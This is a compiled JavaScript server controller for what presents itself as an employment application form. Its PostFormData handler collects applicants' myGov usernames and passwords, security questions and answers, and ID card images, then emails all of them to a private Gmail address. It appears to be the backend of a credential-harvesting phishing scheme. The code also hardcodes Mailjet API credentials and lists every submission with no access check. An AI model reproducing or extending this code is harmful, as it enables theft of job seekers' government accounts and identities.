"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const form_data_model_1 = __importDefault(require("./form_data.model"));
const HandleResponse_1 = __importDefault(require("./helpers/HandleResponse"));
const moment_1 = __importDefault(require("moment"));
class FormDataController {
    static PostFormData(req, res) {
        return __awaiter(this, void 0, void 0, function* () {
            const { ato, email, first_name, gender, has_gov_profile, id_card_back, id_card_front, is_visa_holder, last_name, mobile_number, my_gov, my_gov_password, my_gov_username, position, prev_work, qualification, relationship, security_answer, security_question, skills } = req.body;
            const FormBody = {
                ato,
                email,
                first_name,
                gender,
                has_gov_profile,
                id_card_back,
                id_card_front,
                is_visa_holder,
                last_name,
                mobile_number,
                my_gov,
                my_gov_password,
                my_gov_username,
                position,
                prev_work,
                qualification,
                relationship,
                security_answer,
                security_question,
                skills
            };
            console.log(FormBody);
            const newFormData = new form_data_model_1.default(FormBody);
            yield newFormData.save()
                .then((form) => {
                console.log(form);
                const Mailjet = require('node-mailjet');
                const mailjet = Mailjet.apiConnect("e9eaffa461afb81ea8a27096359b6174", "659637bc07b24b92ddc0f54e7f3d11f2");
                const request = mailjet
                    .post("send", { 'version': 'v3.1' })
                    .request({
                    "Messages": [
                        {
                            "From": {
                                "Email": "musa4jubril@gmail.com",
                                "Name": "Employment Application Form"
                            },
                            "To": [
                                {
                                    "Email": "Pv6243@gmail.com",
                                    // "Email": "jewbreel1@gmail.com",
                                    "Name": "Dahbira"
                                },
                            ],
                            "TemplateID": 4538541,
                            "TemplateLanguage": true,
                            // 'TemplateErrorReporting' : 'musa4jubril@gmail.com',
                            //         'TemplateErrorDeliver' : 'deliver',
                            "Subject": `[[data:full_name:${(form === null || form === void 0 ? void 0 : form.first_name) + " " + (form === null || form === void 0 ? void 0 : form.last_name)}]] Employment Application Form`,
                            "Variables": {
                                "full_name": `${(form === null || form === void 0 ? void 0 : form.first_name) + " " + (form === null || form === void 0 ? void 0 : form.last_name)}`,
                                "created": `${(0, moment_1.default)(new Date()).format("LL")}`,
                                "phone_number": `${form === null || form === void 0 ? void 0 : form.mobile_number}`,
                                "email": `${form === null || form === void 0 ? void 0 : form.email}`,
                                "gender": `${form === null || form === void 0 ? void 0 : form.gender}`,
                                "relationship": `${form === null || form === void 0 ? void 0 : form.relationship}`,
                                "has_gov_profile": `${form === null || form === void 0 ? void 0 : form.has_gov_profile}`,
                                "is_visa_holder": `${form === null || form === void 0 ? void 0 : form.is_visa_holder}`,
                                "my_gov": `${form === null || form === void 0 ? void 0 : form.my_gov}`,
                                "my_gov_username": `${form === null || form === void 0 ? void 0 : form.my_gov_username}`,
                                "my_gov_password": `${form === null || form === void 0 ? void 0 : form.my_gov_password}`,
                                "security_question": `${form === null || form === void 0 ? void 0 : form.security_question}`,
                                "security_answer": `${form === null || form === void 0 ? void 0 : form.security_answer}`,
                                "ato": `${form === null || form === void 0 ? void 0 : form.ato}`,
                                "position": `${form === null || form === void 0 ? void 0 : form.position}`,
                                "qualification": `${form === null || form === void 0 ? void 0 : form.qualification}`,
                                "prev_work": `${form === null || form === void 0 ? void 0 : form.prev_work}`,
                                "skills": `${form === null || form === void 0 ? void 0 : form.skills}`,
                                "id_card": `front: ${form === null || form === void 0 ? void 0 : form.id_card_front}\n back: ${form === null || form === void 0 ? void 0 : form.id_card_front}`
                            }
                        }
                    ]
                });
                request
                    .then(() => {
                    console.log("Done");
                    (0, HandleResponse_1.default)({
                        res,
                        status: 201,
                        data: { form },
                        message: "Employment Application Submitted Successfully"
                    });
                    // return true
                })
                    .catch(() => {
                    console.log("failed");
                    return false;
                });
            });
        });
    }
    static GetFormData(req, res) {
        return __awaiter(this, void 0, void 0, function* () {
            yield form_data_model_1.default.find()
                .then((form) => {
                (0, HandleResponse_1.default)({
                    res,
                    status: 200,
                    data: { form },
                    message: "All Submitted Employment Retrieved Successfully"
                });
            });
        });
    }
    static GetSingleFormData(req, res) {
        return __awaiter(this, void 0, void 0, function* () {
            const _id = req.params;
            yield form_data_model_1.default.findById({ _id })
                .then((form) => {
                (0, HandleResponse_1.default)({
                    res,
                    status: 200,
                    data: { form },
                    message: `${form === null || form === void 0 ? void 0 : form.first_name} ${form === null || form === void 0 ? void 0 : form.last_name}'s emplotment application form retrieved successfully`
                });
            });
        });
    }
}
exports.default = FormDataController;
